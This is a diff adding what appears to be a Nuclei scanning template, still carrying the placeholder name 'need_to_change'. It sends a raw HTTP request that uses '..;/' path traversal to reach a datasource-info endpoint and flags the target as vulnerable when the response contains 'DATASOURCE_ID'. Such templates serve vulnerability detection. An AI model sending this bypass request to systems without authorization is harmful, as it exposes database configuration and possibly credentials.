@@ -1,0 +1,25 @@
+id: need_to_change
+
+info:
+  name: need_to_change
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        GET /pub/fe/config/..;/..;/..;/gla/dataSource/selectDatasourceInfo HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"DATASOURCE_ID")
